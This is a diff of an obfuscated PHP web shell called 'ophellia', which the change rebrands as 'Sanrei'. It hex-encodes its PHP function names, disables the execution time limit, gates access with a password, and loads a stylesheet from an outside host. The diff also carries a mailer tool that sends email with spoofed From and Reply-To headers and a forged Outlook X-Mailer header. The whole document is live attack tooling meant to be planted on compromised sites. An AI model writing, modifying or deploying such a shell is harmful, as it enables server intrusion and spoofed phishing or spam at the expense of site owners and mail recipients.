@@ -79,7 +79,7 @@ function gtyp($file)
 "\x69\x6E\x69\x5F\x73\x65\x74"('max_execution_time', 0);
 "\x69\x6E\x69\x5F\x73\x65\x74"('output_buffering', 0);
 "\x73\x65\x73\x73\x69\x6F\x6E\x5F\x73\x74\x61\x72\x74"();
-echo '<html><head><title>o p h e l l i a</title><meta name="viewport" content="width=device-width,initial-scale=1"></head><style>@import url(https://raw.githubusercontent.com/adilhyz/WebShell/master/403/0P/style.css);</style><body>';
+echo '<html><head><title>o p h e l l i a</title><meta name="viewport" content="width=device-width,initial-scale=1"></head><style>@import url(//rei.my.id/style.css);</style><body>';
 if ("\x6D\x64\x35"(${"\x5f\x50\x4f\x53\x54"}['pass']) == $pass) {
   "\x73\x65\x73\x73\x69\x6F\x6E\x5F\x73\x74\x61\x72\x74"();
   ${"\x5F\x53\x45\x53\x53\x49\x4F\x4E"}['pass'] = $pass;
@@ -183,10 +183,10 @@ if (isset(${"\x5F\x53\x45\x53\x53\x49\x4F\x4E"}['pass']) == $pass) {
       die();
   }
     if (hlx($tools) == 'mailer') {
-      echo '<h2>Mailer Tools</h2><form method="post" action="">From: <input type="text" name="from" value="ophellia@' . ${"\x5f\x53\x45\x52\x56\x45\x52"}['SERVER_NAME'] . '"> To: <input type="text" name="to" value="contact@raw.githubusercontent.com/adilhyz/WebShell/master/403/0P"> Subject: <input type="text" name="subject" value="im using your webshell!"><br><textarea name="message" style="width: 40%;" rows="15">my ip address is ' . ${"\x5f\x53\x45\x52\x56\x45\x52"}['REMOTE_ADDR'] . '</textarea><br><input type="submit" value="Execute"/></form><pre>';
+      echo '<h2>Mailer Tools</h2><form method="post" action="">From: <input type="text" name="from" value="sanrei@' . ${"\x5f\x53\x45\x52\x56\x45\x52"}['SERVER_NAME'] . '"> To: <input type="text" name="to" value="contact@target.com"> Subject: <input type="text" name="subject" value="im using your webshell!"><br><textarea name="message" style="width: 40%;" rows="15">my ip address is ' . ${"\x5f\x53\x45\x52\x56\x45\x52"}['REMOTE_ADDR'] . '</textarea><br><input type="submit" value="Execute"/></form><pre>';
       if (isset(${"\x5f\x50\x4f\x53\x54"}['from'])) {
-        $headers = "From: Ophellia <" . ${"\x5f\x50\x4f\x53\x54"}['from'] . ">" . PHP_EOL;
-        $headers .= "Reply-To: Ophellia <" . ${"\x5f\x50\x4f\x53\x54"}['from'] . ">" . PHP_EOL;
+        $headers = "From: Sanrei <" . ${"\x5f\x50\x4f\x53\x54"}['from'] . ">" . PHP_EOL;
+        $headers .= "Reply-To: Sanrei <" . ${"\x5f\x50\x4f\x53\x54"}['from'] . ">" . PHP_EOL;
         $headers .= "Return-Path: " . ${"\x5f\x50\x4f\x53\x54"}['from'] . PHP_EOL;
         $headers .= "X-Mailer: Microsoft Outlook 16.0";
         "\x6d\x61\x69\x6c"(${"\x5f\x50\x4f\x53\x54"}['to'], ${"\x5f\x50\x4f\x53\x54"}['subject'], ${"\x5f\x50\x4f\x53\x54"}['message'], $headers);
